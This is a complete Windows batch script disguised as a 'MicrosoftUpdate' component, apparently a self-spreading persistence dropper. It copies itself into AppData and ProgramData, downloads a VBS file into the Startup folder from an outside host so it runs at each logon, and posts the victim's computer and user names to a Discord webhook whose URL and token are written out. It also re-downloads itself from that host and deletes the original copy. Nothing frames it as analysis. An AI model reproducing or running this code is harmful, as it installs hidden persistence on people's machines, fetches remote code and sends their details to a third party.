@echo off
cls

if exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
set userfile=YES
)
if not exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
mkdir "%APPDATA%/MicrosoftUpdate/"
copy /y %~f0 "%AppData%\MicrosoftUpdate\"
set userfile=YES, NEW CREATED
)


if exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
set pcfile=YES
)
if not exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
mkdir "%PROGRAMDATA%/MicrosoftUpdate/"
copy /y %~f0 "%PROGRAMDATA%\MicrosoftUpdate\"
set pcfile=YES, NEW CREATED
)


if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
set userauto=YES
)
if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
copy /y "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
curl "https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs" --output "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
set userauto=YES, NEW CREATED
)


if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
set pcauto=YES
)
if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
set pcauto=NO, NOT CREATED
)


set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" https://discord.com/api/webhooks/1045852501590675476/fUqcJcCA2TNtHiOLTIrcBJgZDFD_BPWpPoyud-5z3ucLn2fNWquHobLnEiglQtOMwb3v


curl "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%APPDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"
curl "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%PROGRAMDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"


if %~dp0 NEQ %APPDATA%\MicrosoftUpdate\ (
if %~dp0 NEQ %PROGRAMDATA%\MicrosoftUpdate\ (
del /f /q %~f0
))


exit
